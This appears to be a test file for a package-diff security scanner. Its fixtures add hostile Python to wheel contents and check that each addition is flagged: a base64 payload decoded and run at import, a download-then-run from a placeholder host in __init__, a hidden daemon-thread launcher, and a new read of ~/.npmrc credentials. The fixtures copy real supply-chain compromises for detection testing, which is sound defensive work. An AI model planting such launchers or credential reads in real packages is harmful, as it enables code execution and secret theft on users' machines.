// A capability already present somewhere in the old package must not hide the same capability
// newly added to another existing file, and a Python process started on import is high.
// The shapes follow litellm 1.82.7 (decoded payload run from a proxy module), guardrails-ai
// 0.10.1 (download then run, in the package __init__) and lightning 2.6.2 (bundled script
// started from the package __init__ on a thread).
import test from 'node:test';
import assert from 'node:assert/strict';
import { pypiSnapshot } from '../src/snapshot.js';
import { diffSnapshots } from '../src/diff.js';

const META = 'Metadata-Version: 2.1\nName: pkg\nVersion: 1.0.0\n';
const wheel = (files) => pypiSnapshot(new Map(Object.entries({ 'pkg-1.0.0.dist-info/METADATA': META, ...files }).map(([k, v]) => [k, Buffer.from(v)])), 'wheel');
const diff = async (a, b) => diffSnapshots(await wheel(a), await wheel(b));
const high = (r) => r.findings.filter((f) => f.severity === 'high').map((f) => f.title);

const MIGRATE = 'import subprocess\nsubprocess.run(["prisma", "migrate", "deploy"])\n';
const PROXY = 'import os\n\ndef handler():\n    return os.getcwd()\n';
const BLOB = 'A'.repeat(2000);

test('a decoded payload run at import time is found although another file already ran subprocess at import time', async () => {
    const before = { 'pkg/__init__.py': '', 'pkg/migrate.py': MIGRATE, 'pkg/proxy.py': PROXY };
    const launcher = `import subprocess, base64, sys, tempfile, os\nb64_payload = "${BLOB}"\nwith tempfile.TemporaryDirectory() as d:\n    p = os.path.join(d, "p.py")\n    with open(p, "wb") as f:\n        f.write(base64.b64decode(b64_payload))\n    subprocess.run([sys.executable, p])\n`;
    const r = await diff(before, { ...before, 'pkg/proxy.py': PROXY + launcher });
    assert.equal(r.verdict, 'review');
    assert.ok(high(r).some((t) => /starts a Python process at import time/.test(t)), high(r).join('\n'));
    assert.ok(high(r).some((t) => /long encoded string\(s\) plus a new Python process/.test(t)), high(r).join('\n'));
    const launch = r.findings.find((f) => /starts a Python process at import time/.test(f.title));
    assert.deepEqual(launch.locations, [{ file: 'pkg/proxy.py', line: 11 }]);
});

test('download-then-run in a package __init__ is high', async () => {
    const before = { 'pkg/__init__.py': '__all__ = ["x"]\nx = 1\n' };
    const init = 'import urllib.request, subprocess\nx = 1\nwith urllib.request.urlopen("https://h.example/t.pyz") as r, open("/tmp/t.pyz", "wb") as o:\n    o.write(r.read())\nsubprocess.run(["python3", "/tmp/t.pyz"])\n';
    const r = await diff(before, { 'pkg/__init__.py': init });
    assert.equal(r.verdict, 'review');
    assert.ok(high(r).includes('New: executes decoded or downloaded code — downloads and starts a Python process in the same file'), high(r).join('\n'));
});

test('a package __init__ that starts a bundled script on a thread is high', async () => {
    const before = { 'pkg/__init__.py': 'import logging\n', 'pkg/tools.py': 'import subprocess, sys\n\ndef build():\n    subprocess.Popen([sys.executable, "b.py"])\n' };
    const init = 'import logging, os, subprocess, sys, threading\n\ndef _run():\n    subprocess.Popen([sys.executable, os.path.join(os.path.dirname(__file__), "_rt", "start.py")])\n\nthreading.Thread(target=_run, daemon=True).start()\n';
    const r = await diff(before, { ...before, 'pkg/__init__.py': init, 'pkg/_rt/start.py': 'print(1)\n' });
    assert.equal(r.verdict, 'review');
    assert.ok(high(r).includes('New in pkg/__init__.py: starts a new Python process — subprocess.Popen() starts a Python process (in a package __init__, runs on import)'), high(r).join('\n'));
});

test('negative paths: unchanged files, added files, other programs and -c stay as before', async () => {
    const before = { 'pkg/__init__.py': '', 'pkg/migrate.py': MIGRATE, 'pkg/proxy.py': PROXY };
    // An unchanged file keeps its capability silently; nothing new anywhere.
    assert.equal((await diff(before, before)).findings.length, 0);
    // A new file with a capability the package already had: package-wide comparison applies (no finding).
    const added = await diff(before, { ...before, 'pkg/migrate2.py': MIGRATE });
    assert.equal(added.findings.filter((f) => f.kind === 'shell').length, 0, added.findings.map((f) => f.title).join('\n'));
    // A changed file gaining an ordinary capability the package already had: compared package-wide, no finding.
    const gained = await diff(before, { ...before, 'pkg/proxy.py': PROXY + 'import subprocess\nsubprocess.run(["git", "status"])\n' });
    assert.equal(gained.findings.filter((f) => f.kind === 'shell').length, 0, gained.findings.map((f) => f.title).join('\n'));
    // A Python launch only in a test package's __init__ is not a launch on import.
    const t = await diff({ 'pkg/__init__.py': '', 'pkg/tests/__init__.py': '' }, { 'pkg/__init__.py': '', 'pkg/tests/__init__.py': 'import subprocess, sys\nsubprocess.check_output([sys.executable, "h.py"])\n' });
    assert.ok(!t.findings.some((f) => f.severity === 'high' || f.severity === 'medium'), t.findings.map((f) => `${f.severity} ${f.title}`).join('\n'));
    // Starting git (not Python) from __init__ is not a Python launch.
    const git = await diff({ 'pkg/__init__.py': '' }, { 'pkg/__init__.py': 'import subprocess\nV = subprocess.check_output(["git", "describe"])\n' });
    assert.equal(git.findings.filter((f) => f.kind === 'python-spawn').length, 0);
    assert.notEqual(git.verdict, 'review');
    // python -c stays dynamic evaluation, not a Python launch.
    const c = await diff({ 'pkg/__init__.py': '' }, { 'pkg/__init__.py': 'import subprocess, sys\n\ndef f(code):\n    subprocess.run([sys.executable, "-c", code])\n' });
    assert.equal(c.findings.filter((f) => f.kind === 'python-spawn').length, 0);
    assert.ok(c.findings.some((f) => f.kind === 'eval'));
    // A Python launch inside a function of an ordinary module is worth a look, not review.
    const tool = await diff({ 'pkg/__init__.py': '', 'pkg/cli.py': 'X = 1\n' }, { 'pkg/__init__.py': '', 'pkg/cli.py': 'import subprocess, sys\n\ndef main(path):\n    subprocess.run([sys.executable, path])\n' });
    assert.equal(tool.verdict, 'notice');
});

test('a credential path the package already read elsewhere is high when an existing file gains it', async () => {
    const before = { 'pkg/__init__.py': '', 'pkg/config.py': 'import os\nRC = os.path.expanduser("~/.npmrc")\n', 'pkg/client.py': 'def get(u):\n    return u\n' };
    const r = await diff(before, { ...before, 'pkg/client.py': 'import os\n\ndef get(u):\n    open(os.path.expanduser("~/.npmrc")).read()\n    return u\n' });
    assert.equal(r.verdict, 'review');
    const f = r.findings.find((x) => x.kind === 'credential-path');
    assert.match(f.title, /^New in pkg\/client\.py: reads credential or wallet locations — /);
    assert.deepEqual(f.locations.map((l) => l.file), ['pkg/client.py']);
    // The same file unchanged, or the indicator only in the file that already had it: nothing.
    assert.equal((await diff(before, { ...before, 'pkg/config.py': before['pkg/config.py'] + 'X = 1\n' })).findings.filter((x) => x.kind === 'credential-path').length, 0);
});
